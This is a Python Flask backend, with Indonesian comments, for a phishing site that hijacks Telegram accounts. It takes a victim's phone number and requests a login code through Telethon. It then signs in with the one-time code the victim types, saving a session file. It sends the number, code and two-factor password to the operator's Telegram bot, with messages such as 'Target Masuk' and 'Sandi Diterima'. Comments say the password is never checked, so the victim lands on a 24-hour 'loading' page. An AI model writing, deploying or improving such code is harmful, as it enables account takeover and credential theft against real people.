import os
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Izinkan akses dari domain manapun secara global
CORS(app, resources={r"/*": {"origins": "*"}})

# Variabel dari dashboard Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

def send_to_bot(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
    except:
        pass

async def telethon_logic(data):
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')
    nama = data.get('nama', 'User')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        # STEP 1: Kirim OTP
        if step == 1:
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            send_to_bot(f"📲 *Target Masuk*\nNama: {nama}\nNomor: {nomor}")
            return {"status": "success"}, 200

        # STEP 2: Verifikasi OTP & Deteksi 2FA
        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                send_to_bot(f"✅ *Login Tanpa 2FA*\nNomor: {nomor}\nOTP: {otp}")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                # Perintahkan frontend pindah ke halaman sandi
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "error", "message": "Kode OTP Salah!"}, 400

        # STEP 3: Terima Sandi (Abaikan Validasi agar langsung ke Loading)
        elif step == 3:
            send_to_bot(f"🔑 *Sandi Diterima*\nNomor: {nomor}\nSandi: {sandi}")
            # Beri respon sukses agar website pindah ke halaman loading 24 jam
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

# Tambahkan Header CORS secara manual ke setiap respon
@app.after_request
def add_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    return response

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    # Menangani Preflight Request agar tombol tidak gagal
    if request.method == 'OPTIONS':
        return make_response(jsonify({"status": "ok"}), 200)
        
    data = request.json
    try:
        result, status_code = async_to_sync(telethon_logic)(data)
        return make_response(jsonify(result), status_code)
    except Exception as e:
        return make_response(jsonify({"status": "error", "message": str(e)}), 500)

if __name__ == "__main__":
    # Sesuai dengan Port 8080 pada log Railway
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)